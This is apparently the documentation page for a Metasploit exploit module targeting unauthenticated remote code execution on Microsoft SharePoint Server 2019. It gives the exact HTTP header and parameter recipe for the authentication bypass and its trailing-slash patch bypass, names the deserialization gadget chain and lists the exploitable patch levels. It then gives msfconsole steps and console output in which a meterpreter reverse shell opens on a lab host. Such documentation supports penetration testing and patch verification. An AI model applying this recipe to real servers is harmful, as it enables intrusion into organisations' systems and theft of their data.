## Vulnerable Application
This module exploits the authentication bypass vulnerabilities `CVE-2025-49706` and `CVE-2025-53771`, and an unsafe
deserialization vulnerability `CVE-2025-49704`, to achieve unauthenticated RCE against a vulnerable Microsoft
SharePoint Server. The vulnerability `CVE-2025-53770` was disclosed as being a patch bypass of `CVE-2025-49704`,
and as described by the finders, `CVE-2025-53770` targets a different endpoint within the `/_vti_bin/` URI path.
As this exploit module does not target the endpoint associated with `CVE-2025-53770` (per the original finders),
we believe this module is best described as exploiting `CVE-2025-49704` alone (and not `CVE-2025-53770`).

`CVE-2025-49706` is an authentication bypass affecting Microsoft SharePoint Server, allowing a remote unauthenticated
attacker to reach the ToolPane page, located at the `/_layouts/15/ToolPane.aspx` URI. The auth bypass works if an
attacker supplies the following elements to an HTTP request:

* An HTTP Referer header with one of the values `/_layouts/SignOut.aspx`, `/_layouts/14/SignOut.aspx`, or `/_layouts/15/SignOut.aspx`.
* An HTTP query parameter named `DisplayMode` with the value `Edit`.
* An HTTP query parameter with any name and the value `/ToolPane.aspx`, so long as this is the last query parameter.
* An HTTP form parameter named `MSOTlPn_Uri` with the full URL to the `/_controltemplates/15/AclEditor.ascx` endpoint.

`CVE-2025-53771` is a patch bypass for `CVE-2025-49706`. By appending a trailing `/` to the target
`/_layouts/15/ToolPane.aspx` URI, e.g. `/_layouts/15/ToolPane.aspx/` a remote unauthenticated attacker can reach
the ToolPane page.

`CVE-2025-49704` is an unsafe deserialization vulnerability due to bypassing a filter list to allow the instantiation of
`LosFormatter` and `ObjectDataProvider` in the `diffgr:diffgram` XML document, allowing us to kick off a second
stage deserialization gadget (which will be a `TypeConfuseDelegate` + `LosFormatter` gadget chain).

The July 8, 2025, patch for `CVE-2025-49704` did not apply correctly to a SharePoint site that had not also manually run
a SharePoint configuration update. The patch for `CVE-2025-49704` did not address the root cause, and instead marked the
`Microsoft.PerformancePoint.Scorecards.Client` assembly as unsafe. The July 19, 2025, patch for `CVE-2025-53770`
addresses the root cause of `CVE-2025-49704` and does not rely on a manual configuration update to be performed in
order to be affective.

## Testing
This exploit module has been successfully tested against the following versions:

* SharePoint Server 2019 `16.0.10337.12109` - This is the RTM version. Is vulnerable to all 4 CVEs. Exploitation
is reliable.
* SharePoint Server 2019 `16.0.10417.20018` - This is the June 2025 patch level (`KB 5002729)`. Is vulnerable to
all 4 CVEs. Exploitation is reliable.
* SharePoint Server 2019 `16.0.10417.20027` - This is the July 2025 patch level (`KB 5002741`). This patched
out `CVE-2025-49704` and `CVE-2025-49706`, but is vulnerable to `CVE-2025-53770` and `CVE-2025-53771`. Exploitation is
reliable **unless the site administrator has manually performed a configuration update**.

### Setup

Installing Microsoft SharePoint is non-trivial. This [setup guide](https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d)
is a great step-by-step tutorial to get up and running.

After you install SharePoint, you must create a new site, bound to a new port. This is what the exploit will target.

_NOTE: If you enable HTTPS, you will need to manually setup certificates via IIS Manager._

## Verification Steps

1. Start msfconsole
2. `use exploit/windows/http/sharepoint_toolpane_rce`

Configure the target:

3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_HTTP_OR_HTTPS_PORT>`
5. `set SSL true` (If targeting HTTPS)

Configure the payload:

_NOTE: If testing with the default Meterpreter payloads, you will likely need to disable Defender._

6. `set PAYLOAD cmd/windows/http/x64/meterpreter_reverse_tcp`
7. `set LHOST eth0`
8. `set LPORT 4444`

Run the exploit:

9. `check`
10. `exploit`

## Scenarios

### Example 1 (cmd/windows/http/x64/meterpreter_reverse_tcp)

```
msf exploit(windows/http/sharepoint_toolpane_rce) > show options 

Module options (exploit/windows/http/sharepoint_toolpane_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS   192.168.86.50    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (cmd/windows/http/x64/meterpreter_reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                           no        Comma-separate list of extensions to load
   EXTINIT                              no        Initialization strings for extensions
   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        true             yes       Attempt to delete the binary after execution
   FETCH_FILENAME      ccMNrNsj         no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               192.168.86.122   yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


   When FETCH_COMMAND is one of CURL:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf exploit(windows/http/sharepoint_toolpane_rce) > check
[*] 192.168.86.50:80 - The target appears to be vulnerable. Detected Microsoft SharePoint Server 2019 version 16.0.10417.20027
msf exploit(windows/http/sharepoint_toolpane_rce) > exploit 
[*] Started reverse TCP handler on 192.168.86.122:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected Microsoft SharePoint Server 2019 version 16.0.10417.20027
[*] Meterpreter session 3 opened (192.168.86.122:4444 -> 192.168.86.50:62290) at 2025-07-23 12:58:41 +0100

meterpreter > sysinfo
Computer        : WIN-V28QNSO2H05
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : TESTDOMAIN
Logged On Users : 24
Meterpreter     : x64/windows
meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > 
```

### Example 2 (cmd/windows/generic)

```
msf exploit(windows/http/sharepoint_toolpane_rce) > show options 

Module options (exploit/windows/http/sharepoint_toolpane_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS   192.168.86.50    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (cmd/windows/generic):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD   notepad.exe      yes       The command string to execute


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf exploit(windows/http/sharepoint_toolpane_rce) > exploit
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected Microsoft SharePoint Server 2019 version 16.0.10417.20027
[*] Exploit completed, but no session was created.
msf exploit(windows/http/sharepoint_toolpane_rce) >
```

You will be able to observe in Task Manager or Process Explorer that the `w3wp.exe` process has spawned `cmd.exe` which
has spawned `notepad.exe`.
